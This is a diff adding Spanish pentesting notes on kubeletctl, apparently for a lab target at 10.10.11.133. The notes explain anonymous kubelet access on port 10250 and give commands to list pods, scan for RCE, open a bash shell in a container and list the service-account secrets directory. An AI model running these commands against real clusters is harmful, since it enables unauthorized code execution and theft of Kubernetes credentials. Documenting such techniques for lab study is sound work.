@@ -153,6 +153,40 @@ spec:
   automountServiceAccountToken: true
   hostNetwork: true
 ```
+
+### kubeletctl 
+Kubelet es la tecnología que aplica, crea , actualiza y destruye contenedores 
+en un nodo de Kubernetes. 
+
+Por default se emplea sobre el puerto 10250, un puerto que es muy comun en 
+los kubernetes. Y puedes hacer peticiones como usuario anonimo a diferencia de
+kubectl que si quieres hacer una peticion a una API tendras que especificar las
+credenciales o pasarle el correspondiente token con su certificado ca.crt.
+
+Enumeramos pods
+
+--server o -s
+`kubeletctl -s 10.10.11.133 pods`
+
+scan tiene varias obciones asi como ejecutar comandos.
+De esta manera veremos en que pods podemos ejecutar comandos
+
+`kubeletctl -s 10.10.11.133 scan rce`
+
+```bash
+#Ejecucion de comandos.
+
+-c container
+
+-p pods
+
+kubeletctl -s 10.10.11.133 -c nginx -p nginx exec "bash"
+
+#Ruta importante en kubernetes
+
+kubeletctl -s 10.10.11.133 -c nginx -p nginx exec "ls /run/secrets/kubernetes.io/serviceaccount/"
+```
+
 ### loadkeys
 Es para cambiar momentaneamente la asignación del idioma del teclado
 `loadkeys es`
